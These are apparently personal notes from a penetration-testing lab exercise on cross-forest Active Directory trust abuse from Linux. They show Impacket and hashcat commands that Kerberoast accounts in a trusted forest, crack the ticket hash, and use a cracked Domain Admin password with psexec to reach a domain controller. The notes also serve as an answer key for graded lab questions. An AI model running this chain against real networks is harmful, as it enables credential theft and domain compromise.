# [Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux](Attacking%20Domain%20Trusts%20-%20Cross-Forest%20Trust%20Abuse%20-%20from%20Linux.md)
### Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.

```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
![](Screenshot%202026-06-01%20at%2016.34.24.png)
### Crack the TGS and submit the cleartext password as your answer.

```shell
3kjS@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
![](Screenshot%202026-06-01%20at%2016.37.21.png)

```shell
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-06-01%20at%2016.36.18.png)
### Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

```shell
psexec.py ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@172.16.5.238
```
![](Screenshot%202026-06-01%20at%2016.40.22.png)
